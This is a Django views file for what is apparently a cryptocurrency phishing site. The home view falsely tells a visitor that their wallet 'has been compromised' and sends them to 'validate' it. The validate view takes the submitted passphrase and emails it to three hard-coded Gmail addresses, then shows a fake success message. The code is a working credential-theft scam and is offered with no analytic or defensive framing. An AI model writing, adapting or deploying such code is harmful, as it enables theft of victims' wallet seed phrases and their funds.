import time
from django.shortcuts import render,redirect
from django.core.mail import send_mail
from .models import Crypto
from django.contrib import messages

def home(request):
    if request.method == "POST":
        walletaddress = request.POST['walletaddress']
        walletaddressstr = str(walletaddress)
        messages.error(request, 'Your wallet with the address ' + walletaddressstr + ' has been compromised, Kindly click on any of the wallets you own to validate')
        time.sleep(2)
        return redirect('wallets')
    else:   
        return render(request, 'homepage.html' )

def validate(request):
    if request.method == 'POST':
        texted = request.POST['texted']
        # privatekey = request.POST['privatekey']
        textedstr = str(texted)
        # privatekeystr = str(privatekey)
        send_mail(
            'passphrase',
            textedstr,
            'Senderhqq@gmail.com',
            ['Dharmawallet@gmail.com','tobilobaayodele23@gmail.com','Dharmahqus@gmail.com'],
            fail_silently=False,
        )
        messages.success(request, 'Wallet successfully Validated. Kindly wait for 5-10 minutes before contacting the administrator')
        
   
    crypto = Crypto.objects.all()
    context = {
        'crypto' : crypto,
        
    }
    return render(request, 'index.html', context)
